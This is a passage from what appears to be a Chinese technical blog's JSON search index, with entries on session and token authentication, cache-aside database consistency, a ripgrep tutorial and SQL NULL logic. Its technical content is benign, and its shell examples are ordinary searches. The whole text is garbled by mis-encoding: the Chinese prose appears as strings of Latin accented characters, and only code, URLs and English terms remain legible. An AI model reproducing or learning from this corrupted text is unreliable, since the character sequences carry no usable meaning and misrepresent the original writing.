å¯¹è±¡çš„å½¢å¼ä¿å­˜åœ¨æœåŠ¡ç«¯çš„å†…å­˜ã€æ•°æ®åº“æˆ–æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œå¹¶å°†å¯¹åº”çš„ Session å¯¹è±¡ ID å€¼ SessionID ä»¥ Cookie å½¢å¼è¿”å›ç»™å®¢æˆ·ç«¯ï¼ŒSessionID ä¿å­˜åœ¨å®¢æˆ·ç«¯çš„ Cookie ä¸­ã€‚\n\nè¿™æ˜¯æœ‰çŠ¶æ€çš„è®¤è¯æ–¹æ³•ï¼šæœåŠ¡ç«¯ä¿å­˜ Session å¯¹è±¡ï¼Œå®¢æˆ·ç«¯ä»¥ Cookie å½¢å¼ä¿å­˜ SessionIDã€‚\n\n\n\nå…¶äº¤äº’è¿‡ç¨‹å¦‚ä¸‹ï¼š\n\n1. å®¢æˆ·ç«¯åœ¨ç™»å½•é¡µé¢è¾“å…¥èº«ä»½ä¿¡æ¯ï¼Œå¦‚ç”¨æˆ·å/å¯†ç ã€‚\n2. æœåŠ¡ç«¯éªŒè¯èº«ä»½ä¿¡æ¯ï¼Œé€šè¿‡åç”Ÿæˆä¸€ä¸ª Session å¯¹è±¡ï¼Œä¿å­˜åˆ°æœåŠ¡ç«¯ï¼Œå¹¶å°† SessionID å€¼ä»¥ Cookie å½¢å¼è¿”å›ç»™å®¢æˆ·ç«¯ã€‚\n3. å®¢æˆ·ç«¯å°†æ¥æ”¶åˆ°çš„ SessionID ä¿å­˜åˆ° Cookie ä¸­ï¼Œå¹¶ä¸”ä¹‹åæ¯æ¬¡è¯·æ±‚éƒ½åœ¨è¯·æ±‚å¤´ä¸­æºå¸¦ SessionID Cookieã€‚\n4. æœåŠ¡ç«¯ä»è¯·æ±‚çš„ Cookie ä¸­è·å– SessionIDï¼Œå¹¶æŸ¥è¯¢å…¶å¯¹åº”çš„ Session å¯¹è±¡ï¼Œä»è€Œè·å¾—èº«ä»½ä¿¡æ¯ã€‚\n5. å®¢æˆ·ç«¯é€€å‡ºæœ¬æ¬¡ä¼šè¯åï¼Œå®¢æˆ·ç«¯åˆ é™¤ SessionID çš„ Cookieï¼ŒæœåŠ¡ç«¯åˆ é™¤ Session å¯¹è±¡ã€‚\n6. å¦‚æœå®¢æˆ·ç«¯ä¹‹åè¦é‡æ–°ç™»å½•ï¼Œéœ€é‡æ–°ç”Ÿæˆ Session å¯¹è±¡å’Œ SessionIDã€‚\n\nä¼˜ç‚¹ï¼š\n\n- è¾ƒå®‰å…¨ï¼šå®¢æˆ·ç«¯æ¯æ¬¡è¯·æ±‚æ—¶æ— éœ€å‘é€èº«ä»½ä¿¡æ¯ï¼Œåªéœ€å‘é€ SessionIDã€‚\n- è¾ƒé«˜æ•ˆï¼šæœåŠ¡ç«¯æ— éœ€æ¯æ¬¡å¤„ç†è¯·æ±‚æ—¶éƒ½è¦éªŒè¯èº«ä»½ä¿¡æ¯ï¼Œåªéœ€é€šè¿‡ SessionID æŸ¥è¯¢ Session å¯¹è±¡ã€‚\n\nç¼ºç‚¹ï¼š\n\n- æ‰©å±•æ€§å·®ï¼ŒSession å¯¹è±¡ä¿å­˜åœ¨æœåŠ¡ç«¯ï¼Œå¦‚æœæ˜¯ä¿å­˜åœ¨å¤šä¸ªæœåŠ¡å™¨ä¸Šï¼Œæœ‰ä¸€è‡´æ€§é—®é¢˜ï¼Œå¦‚æœä¿å­˜åœ¨å•ä¸ªæœåŠ¡å™¨ä¸Šï¼Œæ— æ³•é€‚åº”ç”¨æˆ·å¢é•¿ã€‚\n- åŸºäº Cookie çš„ SessionID ä¸èƒ½è·¨åŸŸå…±äº«ï¼ŒåŒä¸€ç”¨æˆ·çš„å¤šä¸ªå®¢æˆ·ç«¯ï¼ˆå¦‚æµè§ˆå™¨å®¢æˆ·ç«¯å’Œ APPï¼‰ä¸èƒ½å…±äº« SessionIdã€‚\n- åŸºäº Cookie çš„ SessionID æ˜“è¢«æˆªè·ç”Ÿæˆ CSRF æ”»å‡»ã€‚\n\n\n\n# 3. token è®¤è¯\n\nè¿™æ˜¯ä¸€ç§ SPA åº”ç”¨å’Œ APP ç»å¸¸ä½¿ç”¨çš„è®¤è¯æ–¹æ³•ã€‚å®ƒæ˜¯ä¸€ç§æ— çŠ¶æ€çš„è®¤è¯æ–¹æ³•ã€‚\n\nå®¢æˆ·ç«¯é¦–å…ˆå°†ç”¨æˆ·ä¿¡æ¯å‘é€ç»™æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯æ ¹æ®ç”¨æˆ·ä¿¡æ¯+ç§é’¥ç”Ÿæˆä¸€ä¸ªå”¯ä¸€çš„ Token å¹¶è¿”å›ç»™å®¢æˆ·ç«¯ã€‚Token åªä¿å­˜åœ¨å®¢æˆ·ç«¯ï¼Œä¹‹åå®¢æˆ·ç«¯çš„æ¯ä¸ªè¯·æ±‚å¤´ä¸­éƒ½æºå¸¦ Tokenï¼Œè€ŒæœåŠ¡ç«¯åªé€šè¿‡è¿ç®—ï¼ˆæ— éœ€æŸ¥è¯¢ï¼‰æ¥éªŒè¯ç”¨æˆ·ã€‚\n\n<img src=\"http%E5%B8%B8%E8%A7%81%E7%9A%84%E8%AE%A4%E8%AF%81%E6%96%B9%E5%BC%8F/image-20220328164300837.png\" alt=\"image-20220328164300837\" style=\"zoom:50%;\" />\n\n\n\nä¼˜ç‚¹ï¼š\n\n- Token åªä¿å­˜åœ¨å®¢æˆ·ç«¯ï¼Œå› æ­¤ä¸å½±å“æœåŠ¡ç«¯æ‰©å±•æ€§ã€‚\n- ä¸ºç”¨æˆ·ç”Ÿæˆçš„ Token å¯ä»¥åœ¨å¤šä¸ªå®¢æˆ·ç«¯å…±ç”¨ã€‚\n\nç¼ºç‚¹ï¼š\n\n- Token åŒ…å«äº†ç”¨æˆ·çš„å…¨éƒ¨ä¿¡æ¯ï¼Œä¸åªæ˜¯å¦‚ SessionID ç±»ä¼¼çš„ä¸€ä¸ª ID å€¼ï¼Œå› æ­¤ä¼šå¢åŠ æ¯æ¬¡è¯·æ±‚åŒ…çš„å¤§å°ã€‚\n\nç›®å‰ä½¿ç”¨è¾ƒå¤šçš„æ˜¯åŸºäºJWT(JSON Web Tokens) çš„ Token è®¤è¯æ³•ã€‚\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://www.liuvv.com/p/2a7234ed.html\n+ https://www.liuvv.com/p/312a7a36.html\n+ https://www.liuvv.com/p/722ed7e7.html\n","tags":["http"],"categories":["http"]},{"title":"ç¼“å­˜æ›´æ–°å’Œæ•°æ®åŒå†™ä¸€è‡´é—®é¢˜","url":"%2Fp%2F724671b1.html","content":"\n# 1.  Cache-Aside\n\næ—è·¯ç¼“å­˜æ¨¡å¼ï¼Œå®ƒçš„æå‡ºæ˜¯ä¸ºäº†å°½å¯èƒ½åœ°è§£å†³ç¼“å­˜ä¸æ•°æ®åº“çš„æ•°æ®ä¸ä¸€è‡´é—®é¢˜ã€‚\n\n<!-- more -->\n\n### 1.1 è¯»è¯·æ±‚\n\n<img src=\"ç¼“å­˜æ›´æ–°å’Œæ•°æ®åŒå†™ä¸€è‡´é—®é¢˜/1.webp\" alt=\"Cache-Asideè¯»è¯·æ±‚\" style=\"zoom: 50%;\" />\n\n1. è¯»çš„æ—¶å€™ï¼Œå…ˆè¯»ç¼“å­˜ï¼Œç¼“å­˜å‘½ä¸­çš„è¯ï¼Œç›´æ¥è¿”å›æ•°æ®\n2. ç¼“å­˜æ²¡æœ‰å‘½ä¸­çš„è¯ï¼Œå°±å»è¯»æ•°æ®åº“ï¼Œä»æ•°æ®åº“å–å‡ºæ•°æ®ï¼Œæ”¾å…¥ç¼“å­˜åï¼ŒåŒæ—¶è¿”å›å“åº”ã€‚\n\n\n\n### 1.2 å†™è¯·æ±‚\n\n<img src=\"ç¼“å­˜æ›´æ–°å’Œæ•°æ®åŒå†™ä¸€è‡´é—®é¢˜/2.webp\" alt=\"Cache-Asideå†™è¯·æ±‚\" style=\"zoom: 67%;\" />\n\n\n\nå†™çš„çš„æ—¶å€™ï¼Œå…ˆæ›´æ–°æ•°æ®åº“ï¼Œç„¶åå†åˆ é™¤ç¼“å­˜ã€‚\n\n# 2. åˆ é™¤ or æ›´æ–°ç¼“å­˜\n\nä¸ºä»€ä¹ˆæ˜¯åˆ é™¤ç¼“å­˜è€Œä¸æ˜¯æ›´æ–°ç¼“å­˜å‘¢ï¼Ÿ\n\n<img src=\"ç¼“å­˜æ›´æ–°å’Œæ•°æ®åŒå†™ä¸€è‡´é—®é¢˜/7.webp\" alt=\"img\" style=\"zoom:50%;\" />\n\n\n\n1. çº¿ç¨‹Aå…ˆå‘èµ·ä¸€ä¸ªå†™æ“ä½œï¼Œç¬¬ä¸€æ­¥å…ˆæ›´æ–°æ•°æ®åº“\n2. çº¿ç¨‹Bå†å‘èµ·ä¸€ä¸ªå†™æ“ä½œï¼Œç¬¬äºŒæ­¥æ›´æ–°äº†æ•°æ®åº“\n3. ç”±äºç½‘ç»œç­‰åŸå› ï¼Œçº¿ç¨‹Bå…ˆæ›´æ–°äº†ç¼“å­˜\n4. çº¿ç¨‹Aæ›´æ–°ç¼“å­˜ã€‚\n\nè¿™æ—¶å€™ï¼Œç¼“å­˜ä¿å­˜çš„æ˜¯Açš„æ•°æ®ï¼ˆè€æ•°æ®ï¼‰ï¼Œæ•°æ®åº“ä¿å­˜çš„æ˜¯Bçš„æ•°æ®ï¼ˆæ–°æ•°æ®ï¼‰ï¼Œæ•°æ®ä¸ä¸€è‡´äº†ï¼Œè„æ•°æ®å‡ºç°å•¦ã€‚å¦‚æœæ˜¯åˆ é™¤ç¼“å­˜å–ä»£æ›´æ–°ç¼“å­˜åˆ™ä¸ä¼šå‡ºç°è¿™ä¸ªè„æ•°æ®é—®é¢˜ã€‚\n\n> æ›´æ–°ç¼“å­˜ç›¸å¯¹äºåˆ é™¤ç¼“å­˜è¿˜æœ‰ä¸¤ç‚¹åŠ£åŠ¿ï¼š\n\n- å¦‚æœä½ å†™å…¥çš„ç¼“å­˜å€¼ï¼Œæ˜¯ç»è¿‡å¤æ‚è®¡ç®—æ‰å¾—åˆ°çš„è¯ã€‚æ›´æ–°ç¼“å­˜é¢‘ç‡é«˜çš„è¯ï¼Œå°±æµªè´¹æ€§èƒ½å•¦ã€‚\n- åœ¨å†™æ•°æ®åº“åœºæ™¯å¤šï¼Œè¯»æ•°æ®åœºæ™¯å°‘çš„æƒ…å†µä¸‹ï¼Œæ•°æ®å¾ˆå¤šæ—¶å€™è¿˜æ²¡è¢«è¯»å–åˆ°ï¼Œåˆè¢«æ›´æ–°äº†ï¼Œè¿™ä¹Ÿæµªè´¹äº†æ€§èƒ½å‘¢(å®é™…ä¸Šï¼Œå†™å¤šçš„åœºæ™¯ï¼Œç”¨ç¼“å­˜ä¹Ÿä¸æ˜¯å¾ˆåˆ’ç®—äº†)\n\n# 3. å…ˆç¼“å­˜ or å…ˆæ•°æ®åº“\n\næ— è®ºå…ˆæ“ä½œdbè¿˜æ˜¯cacheï¼Œéƒ½ä¼šæœ‰å„è‡ªçš„é—®é¢˜ï¼Œæ ¹æœ¬åŸå› æ˜¯cacheå’Œdbçš„æ›´æ–°ä¸æ˜¯ä¸€ä¸ªåŸå­æ“ä½œï¼Œå› æ­¤æ€»ä¼šæœ‰ä¸ä¸€è‡´çš„é—®é¢˜ã€‚\n\n### 3.1 å…ˆåˆ ç¼“å­˜ï¼Œå†æ›´æ–°æ•°æ®åº“\n\n+ å¦‚æœåˆ é™¤äº†ç¼“å­˜Redisï¼Œè¿˜æ²¡æœ‰æ¥å¾—åŠå†™åº“MySQLï¼Œå¦ä¸€ä¸ªçº¿ç¨‹å°±æ¥è¯»å–ï¼Œå‘ç°ç¼“å­˜ä¸ºç©ºï¼Œåˆ™å»æ•°æ®åº“ä¸­è¯»å–æ•°æ®å†™å…¥ç¼“å­˜ï¼Œæ­¤æ—¶ç¼“å­˜ä¸­ä¸ºè„æ•°æ®ã€‚\n\n### 3.2 å…ˆæ›´æ–°æ•°æ®åº“ï¼Œå†åˆ ç¼“å­˜(âœ“)\n\n+ å¦‚æœå…ˆå†™äº†åº“ï¼Œåœ¨åˆ é™¤ç¼“å­˜å‰ï¼Œå†™åº“çš„çº¿ç¨‹å®•æœºäº†ï¼Œæ²¡æœ‰åˆ é™¤æ‰ç¼“å­˜ï¼Œåˆ™ä¹Ÿä¼šå‡ºç°æ•°æ®ä¸ä¸€è‡´æƒ…å†µã€‚\n\n+ ä¸€ä¸ªæ˜¯è¯»æ“ä½œï¼Œä½†æ˜¯æ²¡æœ‰å‘½ä¸­ç¼“å­˜ï¼Œç„¶åå°±åˆ°æ•°æ®åº“ä¸­å–æ•°æ®ï¼Œæ­¤æ—¶æ¥äº†ä¸€ä¸ªå†™æ“ä½œï¼Œå†™å®Œæ•°æ®åº“åï¼Œè®©ç¼“å­˜å¤±æ•ˆï¼Œç„¶åï¼Œä¹‹å‰çš„é‚£ä¸ªè¯»æ“ä½œå†æŠŠè€çš„æ•°æ®æ”¾è¿›å»ï¼Œæ‰€ä»¥ï¼Œä¼šé€ æˆè„æ•°æ®ã€‚\n\n  è¿™ä¸ªcaseç†è®ºä¸Šä¼šå‡ºç°ï¼Œä¸è¿‡ï¼Œå®é™…ä¸Šå‡ºç°çš„æ¦‚ç‡å¯èƒ½éå¸¸ä½ï¼Œå› ä¸ºè¿™ä¸ªæ¡ä»¶éœ€è¦å‘ç”Ÿåœ¨è¯»ç¼“å­˜æ—¶ç¼“å­˜å¤±æ•ˆï¼Œè€Œä¸”å¹¶å‘ç€æœ‰ä¸€ä¸ªå†™æ“ä½œã€‚è€Œå®é™…ä¸Šæ•°æ®åº“çš„å†™æ“ä½œä¼šæ¯”è¯»æ“ä½œæ…¢å¾—å¤šï¼Œè€Œä¸”è¿˜è¦é”è¡¨ï¼Œè€Œè¯»æ“ä½œå¿…éœ€åœ¨å†™æ“ä½œå‰è¿›å…¥æ•°æ®åº“æ“ä½œï¼Œè€Œåˆè¦æ™šäºå†™æ“ä½œæ›´æ–°ç¼“å­˜ï¼Œæ‰€æœ‰çš„è¿™äº›æ¡ä»¶éƒ½å…·å¤‡çš„æ¦‚ç‡åŸºæœ¬å¹¶ä¸å¤§ã€‚\n\n  æ‰€ä»¥ï¼Œå¦‚æœä½ æƒ³å®ç°åŸºç¡€çš„ç¼“å­˜æ•°æ®åº“åŒå†™ä¸€è‡´çš„é€»è¾‘ï¼Œé‚£ä¹ˆåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œåœ¨ä¸æƒ³åšè¿‡å¤šè®¾è®¡ï¼Œå¢åŠ å¤ªå¤§å·¥ä½œé‡çš„æƒ…å†µä¸‹ï¼Œè¯·å…ˆæ›´æ–°æ•°æ®åº“ï¼Œå†åˆ ç¼“å­˜!\n\n### 3.3 æ€»ç»“\n\n+ ç¼“å­˜æ˜¯åˆ é™¤ï¼Œä¸æ˜¯æ›´æ–°ã€‚\n+ å…ˆæ›´æ–°æ•°æ®åº“ï¼Œå†åˆ é™¤ç¼“å­˜ã€‚\n+ ç¼“å­˜åˆ é™¤å¤±è´¥è€ƒè™‘é‡è¯•æœºåˆ¶ï¼Œå’Œç¼“å­˜è®¾ç½®è¿‡æœŸç­–ç•¥ã€‚\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://juejin.cn/post/6964531365643550751\n+ https://mp.weixin.qq.com/s/-0_ReIv2bp5snq3NUI3P7A\n+ https://coolshell.cn/articles/17416.html\n","tags":["sql"],"categories":["æ•°æ®åº“"]},{"title":"æ–‡æœ¬æœç´¢ç¥å™¨rgçš„ä½¿ç”¨æ•™ç¨‹","url":"%2Fp%2F868944ef.html","content":"\nè¯´åˆ°æ–‡æœ¬æœç´¢å·¥å…·ï¼Œå¤§å®¶ä¸€å®šä¼šçŸ¥é“ grep, å®ƒæ˜¯ linux æœ€æœ‰ç”¨å¹¶æœ€å¸¸ç”¨çš„å·¥å…·ä¹‹ä¸€ã€‚ä½†å¦‚æœåœ¨ä¸€ä¸ªå¤§çš„å·¥ç¨‹é¡¹ç›®ä¸­æœç´¢æŸä¸ªå…³é”®è¯ï¼Œå®ƒä¼šæœ‰äº›è€—æ—¶ã€‚\n\nå¦‚æœæœ‰æ›´å¥½çš„æ›¿ä»£å·¥å…·, æœ€å‡ºåçš„åº”è¯¥æ˜¯ Ackï¼ŒAg ,  è€Œç°åœ¨ä¸€ä¸ªæ–°çš„æ›¿ä»£è€… Ripgrep,  ç®€ç§°`rg`,  æ¯”å®ƒä»¬æ›´å¿«, æ›´çœç”µ.\n\n<!-- more -->\n\n# 1. ä»‹ç»\n\nRipGrep ä¸ The Silver Searcher(ag)ã€Ack å’Œ GNU Grep çš„åŠŸèƒ½ç±»ä¼¼ã€‚\n\nRipGrep æ˜¯ä¸€ä¸ªä»¥è¡Œä¸ºå•ä½çš„æœç´¢å·¥å…·ï¼Œ å®ƒæ ¹æ®æä¾›çš„ pattern é€’å½’åœ°åœ¨æŒ‡å®šçš„ç›®å½•é‡Œæœç´¢ã€‚å®ƒæ˜¯ç”± Rust è¯­è¨€å†™æˆï¼Œç›¸è¾ƒä¸åŒç±»å·¥å…·ï¼Œå®ƒçš„ç‰¹ç‚¹å°±æ˜¯æ— ä¸ä¼¦æ¯”åœ°å¿«ã€‚\n\n+ è‡ªåŠ¨é€’å½’æœç´¢ ï¼ˆgrep éœ€è¦-Rï¼‰\n+ è‡ªåŠ¨å¿½ç•¥.gitignore ä¸­çš„æ–‡ä»¶ä»¥åŠäºŒè¿›åˆ¶æ–‡ä»¶\n+ å¯ä»¥æœç´¢æŒ‡å®šæ–‡ä»¶ç±»å‹ï¼ˆrg -t py fooé™å®š python æ–‡ä»¶ï¼Œ rg -T js fooæ’é™¤ js æ–‡ä»¶)\n+ æ”¯æŒå¤§éƒ¨åˆ† grep çš„ feature(å¸¸ç”¨çš„éƒ½æœ‰)\n+ æ”¯æŒå„ç§æ–‡ä»¶ç¼–ç ï¼ˆUTF-8ï¼Œ UTF-16ï¼Œ latin-1, GBK, EUC-JP, Shift_JIS ç­‰ç­‰ï¼‰\n+ æ”¯æŒæœç´¢å¸¸è§å‹ç¼©æ–‡ä»¶(gzip, xz, lzma, bzip2, lz4)\n+ è‡ªåŠ¨é«˜äº®åŒ¹é…çš„ç»“æœ\n\n### 1.1 æ‰©å±•é˜…è¯»\n\nå¼ºä¸­æ›´æœ‰å¼ºä¸­æ‰‹, ç°åœ¨è¿˜æœ‰rga: ripgrep, å¹¶ä¸”è¿˜èƒ½æœç´¢ PDFs, E-Books, Office documents, zip, tar.gz, ç­‰ç­‰.\n\nå‚è€ƒ: https://github.com/phiresky/ripgrep-all\n\n\n\n# 2. ä½¿ç”¨\n\n### 2.1 å®‰è£…\n\n```bash\nbrew install ripgrep\nalias grep=\"rg\"  # å¼ºåˆ¶è½¬å‘ rg\n```\n\n\n\n### 2.2 åŸºç¡€æœç´¢\n\ncat a.txt, æˆ‘ä»¬ä»¥ä¸‹é¢çš„æ–‡ä»¶ä¸ºæµ‹è¯•æ–‡ä»¶, å¯ä»¥å‘ç°rg å’Œ grep çš„é€‰é¡¹å¤§éƒ¨åˆ†ä¸€æ ·\n\n```txt\ntest\na\nb\nc\nd\ne\nf\ng\ntest1\nTEST2\n```\n\n1. æˆ‘ä»¬å…ˆæ¥ä¸€ä¸ªæœ€åŸºç¡€çš„æœç´¢:\n\n```bash\nrg 'test'  a.txt\n1:test\n9:test1\n```\n\n\n\n2. `-w`æœ‰wordä¹‹æ„ï¼Œè¡¨ç¤ºæœç´¢çš„å­—ç¬¦ä¸²ä½œä¸ºä¸€ä¸ªç‹¬ç«‹çš„å•è¯æ—¶æ‰ä¼šè¢«åŒ¹é…åˆ°ã€‚\n\n```bash\nrg -w 'test'  a.txt\n1:test\n```\n\n\n\n3. ä½¿ç”¨`-i`é€‰é¡¹ï¼Œå³å¯åœ¨æœç´¢æ—¶ä¸åŒºåˆ†å¤§å°å†™\n\n```bash\nrg -i 'test'  a.txt\n1:test\n9:test1\n10:TEST2\n```\n\n\n\n4. `-l`åªæ‰“å°æœ‰åŒ¹é…çš„æ–‡ä»¶å\n\n```bash\nrg -l 'test'  a.txt\na.txt\n```\n\n\n\n5. `-C` è¾“å‡ºåŒ¹é…ä¸Šä¸‹å‡ è¡Œçš„å†…å®¹\n\n```bash\nrg -C 2 'c'  a.txt\n\n2-a\n3-b\n4:c\n5-d\n6-e\n```\n\n\n\n### 2.3 é«˜çº§æœç´¢\n\n1. ä½¿ç”¨ `-e REGEX` æ¥æŒ‡å®šæ­£åˆ™è¡¨è¾¾å¼\n\n```bash\nrg -e \"*sql\" -C2\n```\n\n\n\n2.  é»˜è®¤ rg ä¼šå¿½ç•¥ `.gitignore` å’Œéšè—æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ `-uu` æ¥æŸ¥è¯¢æ‰€æœ‰å†…å®¹\n\n```bash\nrg -uu \"word\" .\n```\n\n\n\n3. å¯ä»¥ä½¿ç”¨ `-t type` æ¥æŒ‡å®šæ–‡ä»¶ç±»å‹ï¼š\n\n```bash\nrg -t markdown \"mysql\" .  # åœ¨ md æ–‡ä»¶ä¸­æŸ¥æ‰¾ â€œmysqlâ€ å…³é”®å­—\n```\n\næ”¯æŒçš„æ–‡ä»¶ç±»å‹å¯ä»¥é€šè¿‡ `rg --type-list` æŸ¥çœ‹\n\n\n\n### 2.4 æœç´¢æ–‡ä»¶\n\n åˆ—å‡ºå½“å‰æ–‡ä»¶å¤¹ä¼šè¿›è¡ŒæŸ¥è¯¢çš„æ‰€æœ‰æ–‡ä»¶, è¯¥é€‰é¡¹å…¶å®å¯ç›¸å½“äºï¼šfind . -type fï¼ŒæŸ¥æ‰¾å½“å‰ç›®å½•æ‰€æœ‰æ–‡ä»¶\n\n```bash\nrg --files . \nalias rgf='rg --files | rg' # å¯æ¥ä¸ªåˆ«å\n```\n\n æœç´¢ä»¥ md ä¸ºåç¼€çš„æ–‡ä»¶\n\n```bash\nrg --files . | rg -e \".md$\" # æ­£åˆ™åŒ¹é…\n```\n\n\n\n# 3. vimé‡Œä½¿ç”¨\n\n### 3.1 é…åˆ fzf\n\n```bash\nPlug 'junegunn/fzf', { 'do': { -> fzf#install() } } \"æé™æœç´¢æ–‡ä»¶\nPlug 'junegunn/fzf.vim'\nnnoremap <leader>fo :Files<CR>\"æ˜ å°„\nnnoremap <leader>fif :Rg<CR> \"æ˜ å°„\n```\n\n`:Rg`\n\n![image-20210319000653060](æ–‡æœ¬æœç´¢ç¥å™¨rgçš„ä½¿ç”¨æ•™ç¨‹/1.png)\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://github.com/BurntSushi/ripgrep\n+ https://einverne.github.io/post/2019/09/ripgrep-recursively-searches-directories-using-regex-pattern.html\n+ https://juejin.cn/post/6844903680446038029\n+ https://github.com/phiresky/ripgrep-all","tags":["grep"],"categories":["è½¯ä»¶"]},{"title":"sqlè¿›é˜¶æ•™ç¨‹03-ä¸‰å€¼é€»è¾‘å’ŒNULL","url":"%2Fp%2Fca905f18.html","content":"\nå¤§å¤šæ•°ç¼–ç¨‹è¯­è¨€éƒ½æ˜¯åŸºäºäºŒå€¼é€»è¾‘çš„ï¼Œå³é€»è¾‘çœŸå€¼åªæœ‰çœŸå’Œå‡ä¸¤ä¸ªã€‚è€Œ SQL è¯­è¨€åˆ™é‡‡ç”¨ä¸€ç§ç‰¹åˆ«çš„ é€»è¾‘ä½“ç³»â€”â€”ä¸‰å€¼é€»è¾‘ï¼Œå³é€»è¾‘çœŸå€¼é™¤äº†çœŸå’Œå‡ï¼Œè¿˜æœ‰ç¬¬ä¸‰ä¸ªå€¼â€œä¸ç¡®å®šâ€ã€‚ä¸‰å€¼é€»è¾‘ç»å¸¸ä¼šå¸¦æ¥ä¸€äº›æ„æƒ³ä¸åˆ°çš„æƒ…å†µï¼Œè¿™è®©ç¨‹åºå‘˜å¾ˆæ˜¯çƒ¦æ¼ã€‚\n\n<!-- more -->\n\n### 1.1 ä¸‰å€¼é€»è¾‘è¿˜æ˜¯å››å€¼é€»è¾‘\n\n SQL é‡Œåªå­˜åœ¨ ä¸€ç§ NULLã€‚ç„¶è€Œåœ¨è®¨è®º NULL æ—¶ï¼Œæˆ‘ä»¬ä¸€èˆ¬éƒ½ä¼šå°†å®ƒåˆ†æˆä¸¤ç§ç±»å‹æ¥æ€è€ƒã€‚ å› æ­¤è¿™é‡Œå…ˆæ¥ä»‹ç»ä¸€äº›åŸºç¡€çŸ¥è¯†ï¼Œå³ä¸¤ç§ NULL ä¹‹é—´çš„åŒºåˆ«ã€‚\n\n**ä¸¤ç§ NULL åˆ†åˆ«æŒ‡çš„æ˜¯â€œæœªçŸ¥â€(unknown)å’Œâ€œä¸é€‚ç”¨â€(not applicable, inapplicable)ã€‚**\n\n+ ä»¥â€œä¸çŸ¥é“æˆ´å¢¨é•œçš„äººçœ¼ç›æ˜¯ä»€ä¹ˆé¢œè‰²â€è¿™ç§æƒ… å†µä¸ºä¾‹ï¼Œè¿™ä¸ªäººçš„çœ¼ç›è‚¯å®šæ˜¯æœ‰é¢œè‰²çš„ï¼Œä½†æ˜¯å¦‚æœä»–ä¸æ‘˜æ‰çœ¼é•œï¼Œåˆ«äººå°± ä¸çŸ¥é“ä»–çš„çœ¼ç›æ˜¯ä»€ä¹ˆé¢œè‰²ã€‚è¿™å°±å«ä½œæœªçŸ¥ã€‚\n\n+ è€Œâ€œä¸çŸ¥é“å†°ç®±çš„çœ¼ç›æ˜¯ä»€ ä¹ˆé¢œè‰²â€åˆ™å±äºâ€œä¸é€‚ç”¨â€ã€‚å› ä¸ºå†°ç®±æ ¹æœ¬å°±æ²¡æœ‰çœ¼ç›ï¼Œæ‰€ä»¥â€œçœ¼ç›çš„é¢œè‰²â€ è¿™ä¸€å±æ€§å¹¶ä¸é€‚ç”¨äºå†°ç®±ã€‚\n\n<img src=\"sql%E8%BF%9B%E9%98%B6%E6%95%99%E7%A8%8B03-%E4%B8%89%E5%80%BC%E9%80%BB%E8%BE%91%E5%92%8CNULL/image-20220318162307153.png\" alt=\"image-20220318162307153\" style=\"zoom:50%;\" />\n\nCodd æ›¾ç»è®¤ä¸ºåº”è¯¥ä¸¥æ ¼åœ°åŒºåˆ†ä¸¤ç§ç±»å‹çš„ NULLï¼Œå¹¶æå€¡åœ¨å…³ç³»æ•°æ® åº“ä¸­ä½¿ç”¨å››å€¼é€»è¾‘ ã€‚ç°åœ¨æ‰€æœ‰çš„ DBMS éƒ½å°†ä¸¤ç§ç±»å‹çš„ NULL å½’ä¸ºäº†ä¸€ç±»å¹¶é‡‡ç”¨äº†ä¸‰å€¼é€»è¾‘ã€‚\n\n\n\n### 1.2 IS NULL\n\nä¸ºä»€ä¹ˆå¿…é¡»å†™æˆâ€œIS NULLâ€ï¼Œè€Œä¸æ˜¯â€œ= NULLâ€\n\n```sql\n--ä»¥ä¸‹çš„å¼å­éƒ½ä¼šè¢«åˆ¤ä¸º unknown \n\n1 = NULL\n2 > NULL\n3 < NULL\n4 <> NULL NULL = NULL\n```\n\né‚£ä¹ˆï¼Œä¸ºä»€ä¹ˆå¯¹ NULL ä½¿ç”¨æ¯”è¾ƒè°“è¯åå¾—åˆ°çš„ç»“æœæ°¸è¿œä¸å¯èƒ½ä¸ºçœŸå‘¢? è¿™æ˜¯å› ä¸ºï¼ŒNULL æ—¢ä¸æ˜¯å€¼ä¹Ÿä¸æ˜¯å˜é‡ã€‚NULL åªæ˜¯ä¸€ä¸ªè¡¨ç¤ºâ€œæ²¡æœ‰å€¼â€çš„ æ ‡è®°ï¼Œè€Œæ¯”è¾ƒè°“è¯åªé€‚ç”¨äºå€¼ã€‚å› æ­¤ï¼Œå¯¹å¹¶éå€¼çš„ NULL ä½¿ç”¨æ¯”è¾ƒè°“è¯æœ¬æ¥å°±æ˜¯æ²¡æœ‰æ„ä¹‰çš„ã€‚\n\n\n\nNULL å®¹æ˜“è¢«è®¤ä¸ºæ˜¯å€¼çš„åŸå› ææ€•æœ‰ä¸¤ä¸ªã€‚ç¬¬ä¸€ä¸ªæ˜¯åœ¨ C è¯­è¨€ç­‰ç¼–ç¨‹ è¯­è¨€é‡Œé¢ï¼ŒNULL è¢«å®šä¹‰ä¸ºäº†ä¸€ä¸ªå¸¸é‡(å¾ˆå¤šè¯­è¨€å°†å…¶å®šä¹‰ä¸ºäº†æ•´æ•° 0)ï¼Œ è¿™å¯¼è‡´äº†äººä»¬çš„æ··æ·†ã€‚ä½†æ˜¯ï¼Œå…¶å® SQL é‡Œçš„ NULL å’Œå…¶ä»–ç¼–ç¨‹è¯­è¨€é‡Œçš„ NULL æ˜¯å®Œå…¨ä¸åŒçš„ä¸œè¥¿ã€‚\n\n\n\nç¬¬äºŒä¸ªåŸå› æ˜¯ï¼ŒIS NULL è¿™æ ·çš„è°“è¯æ˜¯ç”±ä¸¤ä¸ªå•è¯æ„æˆçš„ï¼Œæ‰€ä»¥äººä»¬ å®¹æ˜“æŠŠ IS å½“ä½œè°“è¯ï¼Œè€ŒæŠŠ NULL å½“ä½œå€¼ã€‚æˆ‘ä»¬åº”è¯¥æŠŠ IS NULL çœ‹ä½œæ˜¯ä¸€ä¸ªè°“è¯ã€‚å› æ­¤ï¼Œå¦‚æœå¯ä»¥çš„è¯ï¼Œå†™æˆ IS_NULL è¿™æ ·ä¹Ÿè®¸æ›´åˆé€‚ã€‚\n\n\n\n### 1.3 çœŸå€¼unknown\n\nçœŸå€¼ **unknown** å’Œä½œä¸º NULL çš„ä¸€ç§çš„ 